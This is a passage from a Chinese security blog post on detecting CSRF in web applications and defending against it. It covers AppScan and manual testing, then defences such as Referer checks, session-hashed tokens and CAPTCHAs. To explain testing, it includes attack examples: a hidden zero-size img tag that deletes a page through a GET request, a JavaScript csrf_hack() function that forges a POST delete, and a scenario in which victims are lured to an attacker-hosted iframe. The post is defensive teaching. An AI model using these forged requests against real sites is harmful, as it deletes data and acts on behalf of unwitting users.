+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里要注意的问题是误报，Web 应用程序操作大多都是对一个固定的 URL 的请求，包含一些资源文件，以及一些功能性的请求。对于资源文件的操作，很多情况下都是一个静态的请求，在未使用 PUT/DELETE 的应用程序，是无需对 GET 请求进行 CSRF 测试，在这种情况下是不存在 CSRF 漏洞的。而如果使用了 Ajax 框架的应用程序如果存在 DELETE/PUT 操作则需注意很可能出现严重的 CSRF 问题。未使用 Ajax 的产品则集中在 GET/POST 请求，需要注意的是 GET/POST 请求对 CSRF 来说是同样具有可操作性的，对产品的危害性是一致的。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对 CSRF 测试的两个主要方向是路径覆盖测试，和精确测试。之所以是要做如此分类的原因是一个产品有大量的 URL 如果一一测试需要大量的时间精力，覆盖测试是由工具去完成的是为了保证覆盖到产品的各个路径，有些产品实际上已经对 CSRF 有很深的认识，在这种情况下大多数资源已经被很好的保护起来，没有 CSRF 的问题，这时候一个对全路径的测试就是很必要的。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;精确测试是由人来完成的通过分析产品功能和开发人员的沟通，阅读设计文档来完成的。为何要做精确测试的原因是，所有 Web 应用程序非常关注的问题之一就是产品的性能，而对所有请求都做 CSRF 防范的话就比如在一个高速公路上设置一个人工收费站一样会大大影响性能，一个好的 Web 应用在对 CSRF 防范是有针对性的，对一个没有 CSRF 保护的产品，一个良好的 CSRF 保护开端可以是由精确测试的结果为发起的。通过对固定功能的检测，以及对设计文档的了解，基本就可以断定产品是否做了 CSRF 保护。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个正常的使用 Appscan 来检测 CSRF 的流程如图 2 所示。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图 2. 一个正常的使用 Appscan 来检测 CSRF 的流程</p>
+<p><img src="https://github.com/hcldirgit/image/blob/master/Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%20CSRF%20%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E8%8C%83/02.jpeg?raw=true" alt=""></p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;AppScan 使用流程，AppScan 执行过程的一个分解，如图 3。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图 3. AppScan 执行过程的一个分解</p>
+<p><img src="https://github.com/hcldirgit/image/blob/master/Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%20CSRF%20%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E8%8C%83/03.jpeg?raw=true" alt=""></p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;精确测试的方法，目的是为了检测是否存在 CSRF 保护。对 CSRF 保护有个范围约束的问题，并不是所有的请求都需要对 CSRF 攻击做防范。对静态资源除非有 DELETE/PUT 操作允许的情况下，才需要进行测试；而对于关键的业务逻辑，比如银行转帐，确认收货人信息，参加竞标，删除一个用户，赋予用户高级权限，等等，对这类定性问题的约束是根据不同的商业产品各异，要具体问题具体分析。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本例以常见的页面删除为实例，阐述一个可以的测试方法。大概分为以下几种情况 :<br>使用 GET 来删除页面的，使用 DELETE/PUT 来删除页面的，使用 POST 来删除页面的，都是服务器与客户端的交互过程，具体的实例分析起来要远比分类更为复杂，一个    操作可能带有很多各样的请求，找到有威胁的请求才是最终目的，有时候哪怕是         AppScan 已经定位到具体是那个请求，也还需要通过手工将这个案例找出加以描述成为    有实际操作价值的场景，这里就需要引入手工测试工具加以支持。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;手工工具的介绍，做精确测试需要对 HTTP 请求做频繁的操作，如果需要查看请求的内容，还有对具体请求的操作的观察，推荐使用 Fiddler 或者 WebScarab。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开始手动验证之前，还需要清楚 CSRF 发生的条件。所有的问题的发生有个前提条件是用户常用的浏览器中有一个与目标服务器处于激活状态的会话。这个条件需要的原因是，CSRF 攻击的模式是用户 A 被恶意用户 B 所攻击，攻击是 B 发起的被用户 A 执行实现的。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而 B 往往是在 A 常去的网站注入代码，或者发送链接或者包含附件的文件给 A，而包含着恶意代码或者链接的页面要被执行，条件是用户 A 已经处在和服务器的会话之中，这也是 CSRF 发生的前提条件，也是手工测试的基础。</p>
+<h2 id="对-GET-CSRF-漏洞的测试"><a href="#对-GET-CSRF-漏洞的测试" class="headerlink" title="对 GET CSRF 漏洞的测试"></a>对 GET CSRF 漏洞的测试</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;GET 请求的情况下，请求如 <a href="http://mysite/service?action=delete&amp;pageid=100001" target="_blank" rel="external">http://mysite/service?action=delete&amp;pageid=100001</a> 这类问题的验证最为直接，并且无需写脚本和使用 fiddler 工具去观察实际的请求的格式。检测方法就是在维持一个与服务器连接的前提下，在浏览器地址栏输入如下网址，如果实际的页面被删除了就是 CSRF 攻击成功了。对于如此清楚的实例基本看到 URL 已经可以证明没有任何 CSRF 保护。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可关联的攻击场景如下，在任何可以显示图片的地方写入如下 <img src="http://mysite/service?action=delete&pageid=100001" width="0" height="0/">，另外只需    要指引有删除权限的用户访问一下包含这个图片标签的网页，往往是通过发一个邮件或者 MSN 一个简单的链接就可以完成删除页面的操作。</p>
+<h2 id="对-POST-CSRF-漏洞的测试"><a href="#对-POST-CSRF-漏洞的测试" class="headerlink" title="对 POST CSRF 漏洞的测试"></a>对 POST CSRF 漏洞的测试</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;POST 请求的操作并不能免除 CSRF 的攻击。在浏览器中要发出 POST 请求，可以使用两种方法，一个是通过脚本调用页面文档元素 form 直接进行提交操作，特点是可以进行跨域的脚本提交，隐式攻击。另一种是通过使用 Ajax 对象直接发出请求，但是由于不能跨域发出请求，可执行的力度并不高，但是还是有可能性。同样是一个删除页面的操作，如下所示结构。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">POST http://mysite/service</div><div class="line">Headers….</div><div class="line"></div><div class="line">Action=delete&amp;pageid=100001</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个不同于 GET 之处是不能简单的通过在浏览器直接输入一个链接就能测试。需要借助一下预设好的 HTTP 服务器如 IBM HTTP Server、Domino，或者 IIS。将 IFrame.html 的清单拷贝到服务器的一个目录。通过修改 frame1.html 中的 csrf_hack() 如下。</p>
+<h3 id="清单-4-修改-frame1-html-中的-csrf-hack"><a href="#清单-4-修改-frame1-html-中的-csrf-hack" class="headerlink" title="清单 4. 修改 frame1.html 中的 csrf_hack()"></a>清单 4. 修改 frame1.html 中的 csrf_hack()</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">csrf_hack</span></span>() &#123;</div><div class="line"> 	var fields;</div><div class="line">	fields += <span class="string">"&lt;input type='' name='action' value='"</span>+<span class="string">"delete"</span>+<span class="string">"'&gt;"</span>;</div><div class="line">	fields += <span class="string">"&lt;input type='' name=pageid value='"</span>+<span class="string">"1000001"</span> +<span class="string">"'&gt;"</span>;</div><div class="line">	unescape(fields);</div><div class="line">	post(<span class="string">'http://mysite/service '</span>,fields);</div><div class="line">	alert(<span class="string">"csrf_end"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可关联的攻击场景如下 ，通过邮件或者 MSN 发送一个链接 <a href="http://hackerWebServer/iframe" target="_blank" rel="external">http://hackerWebServer/iframe</a> 给可以删除页面的用户，该操作就会被执行，如果页面删除，攻击成功。通过在其他网站可以做脚本注入的将 iframe.html 脚本写在该网站，    一样可以达到攻击效果。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另一类通过 Ajax 提交的 post 请求，这类结构中多采用 SOAP message 或者类似的 XML 消息体，或者 Jason 消息体提交请求。结构如下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">POST http://mysite/service</div><div class="line">Headers….</div><div class="line"></div><div class="line">&lt;soap:Envelope xmlns:soap=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> </div><div class="line">xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> </div><div class="line">xmlns:xsd=<span class="string">"http://www.w3.org/2001/XMLSchema"</span>&gt;&lt;soap:Header&gt;</div><div class="line">&lt;serviceVersion&gt;8.0.0&lt;/serviceVersion&gt;</div><div class="line">&lt;/soap:Header&gt;&lt;soap:Body&gt;</div><div class="line">&lt;deleteDocument </div><div class="line">xmlns=<span class="string">"http://webservices.clb.content.ibm.com"</span>&gt; </div><div class="line">&lt;path&gt;/@Pcsrftestplace/@RMain.nsf/@F/@DE44FD4FF0956D07648257570002C42DA</div><div class="line">&lt;/path&gt;&lt;/deleteDocument&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在此类情况下，需要修改 form 的表单的 enctype 属性为 multipart/form-data，因为在默认的情况下是 application/x-www-form-urlencoded，所有字符都会做 URL 编码转换，提交的数据是不合法的无法被服务器端识别，所以需要修改 enctype 属性，在 multipart/formdata 的情况下，数据是不会被编码的，而在很多服务器的接收端有的就是    使用 multipart/formdata 去接受数据。由于 javascript 出于对安全的考虑禁止脚本自动修    改 form 中提交的 file 属性的输入的值，所以想通过脚本修改控制 enctype 是不允许的，这样不同于第一类 POST 请求。但是并不影响场景的合理性，通过在有漏洞的网站伪造表单请求，form 指向我们要操作的 URL 即可。这种情况下，需要构造一个完整的表单，并通过用户点击一个任意方式发送的链接达到攻击效果。</p>
+<h2 id="对-DELETE-PUT-CSRF-漏洞的测试"><a href="#对-DELETE-PUT-CSRF-漏洞的测试" class="headerlink" title="对 DELETE/PUT CSRF 漏洞的测试"></a>对 DELETE/PUT CSRF 漏洞的测试</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DELETE/PUT 请求依赖于 Web 2.0 技术，由于本身的限制，自由发出跨站的伪造请求是不可能的。更多使用的是离线攻击，或者本站点的脚本注入攻击。在存在本站点脚本注入攻击的情况下，所有这 4 种情况下，都可以完成隐式的攻击方式。代码请参照 Web 2.0 攻击章节的实例。</p>
+<h2 id="CSRF-的防范"><a href="#CSRF-的防范" class="headerlink" title="CSRF 的防范"></a>CSRF 的防范</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF 的防范机制有很多种，防范的方法也根据 CSRF 攻击方式的不断升级而不断演化。常用的有检查 Refer 头部信息，使用一次性令牌，使用验证图片等手段。出于性能的考虑，如果每个请求都加入令牌验证将极大的增加服务器的负担，具体采用那种方法更合理，需要谨慎审视每种保护的优缺点。</p>
+<ol>
+<li>检查 HTTP 头部 Refer 信息，这是防止 CSRF 的最简单容易实现的一种手段。根据 RFC 对于 HTTP 协议里面 Refer 的定义，Refer 信息跟随出现在每个 Http 请求头部。Server 端在收到请求之后，可以去检查这个头信息，只接受来自本域的请求而忽略外部域的请求，这样就可以避免了很多风险。当然这种检查方式由于过于简单也有它自身的弱点：</li>
+</ol>
+<ul>
+<li>首先是检查 Refer 信息并不能防范来自本域的攻击。在企业业务网站上，经常会有同域的论坛，邮件等形式的 Web 应用程序存在，来自这些地方的 CSRF 攻击所携带的就是本域的 Refer 域信息，因此不能被这种防御手段所阻止。</li>
+<li>同样，某些直接发送 HTTP 请求的方式（指非浏览器，比如用后台代码等方法）可以伪造一些 Refer 信息，虽然直接进行头信息伪造的方式属于直接发送请求，很难跟随发送 cookie，但由于目前客户端手段层出不穷，flash，javascript 等大规模使用，从客户端进行 refer 的伪造，尤其是在客户端浏览器安装了越来越多的插件的情况下已经成为可能了。</li>
+</ul>
+<ol>
+<li>使用一次性令牌，这是当前 Web 应用程序的设计人员广泛使用的一种方式，方法是对于 Get 请求，在 URL 里面加入一个令牌，对于 Post 请求，在隐藏域中加入一个令牌。这个令牌由 server 端生成，由编程人员控制在客户端发送请求的时候使请求携带本令牌然后在 Server 端进行验证。但在令牌的设计上目前存在着几个错误的方案：</li>
+</ol>
+<ul>
+<li>使用和 Session 独立的令牌生成方式。这种令牌的值和 Session 无关，因此容易被其他用户伪造。这里的其他用户指的是当前 Web 应用程序的其他用户和活跃在网络传输阶段各个设置上的监听者，这种恶意用户可能使用自己的令牌来进行替换以便达到伪造的目的。</li>
+<li>完全使用 Session 认证信息作为令牌的生成方式。这种保护方式对于保护 CSRF 是起了作用的，但是可能会造成其他危害，具体来说，如果某些 URL 或者网页被拷贝下来与其他人共享，那么这些 URL 或者拷贝下来的网页中可能会含有用户的会话信息，这种信息一旦被恶意用户获得，就能造成极大的危害。</li>
+</ul>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此，一个正确的令牌设计应该是使用 Session 信息做 Hash，用得出的哈希值来做 CSRF 的令牌。</p>
+<ol>
+<li>使用验证图片，这种方法的出现的作用是对于机器人暴力攻击的防止。但在 CSRF 的防范上，也有一些安全性要求比较高的的应用程序结合验证图片和一次性令牌来做双重保护。由于这种图片验证信息很难被恶意程序在客户端识别，因此能够提高更强的保护。当客户端的浏览器可能已经处于一种不安全的环境中的情况下（比如客户端的安全级别设置较低，客户端浏览器安装了不安全的插件等）。</li>
+</ol>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上给的这些只是防范 CSRF 的比较通用的一些方法，Web 开发人员可以根据自己对自己的应用程序的功能的理解来确定安全级别的要求从而选择使用不同的保护措施，也推荐在同一应用程序内部结合使用多种方法来进行保护。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF 攻击作为一个存在已久的攻击方式，在大量的商业网站上都可以找出，应用本文的知识作出一个合理的分析，有针对性的提出改进方案才是本文作者希望看到的，在即不损害应用程序的性能的前提下，提高安全性；而对即将开发的网络应用程序来说，深刻理解其的危害性，在设计阶段就考虑到对 CSRF 的防范，无疑能收到更好的效果。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux安全/" rel="tag"># Linux安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/17/Linux安全/4. XSS攻击的防范/" rel="next" title="XSS攻击的防范">
+                <i class="fa fa-chevron-left"></i> XSS攻击的防范
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/17/Linux安全/5. nginx 禁止通过ip访问站点/" rel="prev" title="nginx 禁止通过ip访问站点">
+                nginx 禁止通过ip访问站点 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/0.png"
+               alt="失落的乐章" />
+          <p class="site-author-name" itemprop="name">失落的乐章</p>
+           
+              <p class="site-description motion-element" itemprop="description">失落的乐章的Blog</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/">
+                <span class="site-state-item-count">643</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/hcldirgit" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-应用程序常见漏洞-CSRF-的入侵检测与防范"><span class="nav-number">1.</span> <span class="nav-text">Web 应用程序常见漏洞 CSRF 的入侵检测与防范</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-的基本概念特性"><span class="nav-number">1.1.</span> <span class="nav-text">CSRF 的基本概念特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-的危害实例"><span class="nav-number">1.2.</span> <span class="nav-text">CSRF 的危害实例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-攻击的基本路径及方法"><span class="nav-number">1.3.</span> <span class="nav-text">CSRF 攻击的基本路径及方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对-GET-请求的-CSRF-漏洞的攻击方式"><span class="nav-number">1.4.</span> <span class="nav-text">对 GET 请求的 CSRF 漏洞的攻击方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对-POST-请求的-CSRF-漏洞的攻击方式"><span class="nav-number">1.5.</span> <span class="nav-text">对 POST 请求的 CSRF 漏洞的攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#清单-1-Frame1-html-脚本"><span class="nav-number">1.5.1.</span> <span class="nav-text">清单 1. Frame1.html 脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#清单-2-IFrame-html"><span class="nav-number">1.5.2.</span> <span class="nav-text">清单 2. IFrame.html</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-2-0-攻击方式"><span class="nav-number">1.6.</span> <span class="nav-text">Web 2.0 攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#清单-3-通常使用的对-Web-2-0-类型的跨站漏洞的攻击代码"><span class="nav-number">1.6.1.</span> <span class="nav-text">清单 3. 通常使用的对 Web 2.0 类型的跨站漏洞的攻击代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#登陆-CSRF-攻击方式"><span class="nav-number">1.7.</span> <span class="nav-text">登陆 CSRF 攻击方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用-Rational-AppScan-对-CSRF-的检测"><span class="nav-number">1.8.</span> <span class="nav-text">使用 Rational AppScan 对 CSRF 的检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对-GET-CSRF-漏洞的测试"><span class="nav-number">1.9.</span> <span class="nav-text">对 GET CSRF 漏洞的测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对-POST-CSRF-漏洞的测试"><span class="nav-number">1.10.</span> <span class="nav-text">对 POST CSRF 漏洞的测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#清单-4-修改-frame1-html-中的-csrf-hack"><span class="nav-number">1.10.1.</span> <span class="nav-text">清单 4. 修改 frame1.html 中的 csrf_hack()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对-DELETE-PUT-CSRF-漏洞的测试"><span class="nav-number">1.11.</span> <span class="nav-text">对 DELETE/PUT CSRF 漏洞的测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-的防范"><span class="nav-number">1.12.</span> <span class="nav-text">CSRF 的防范</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.13.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">失落的乐章</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
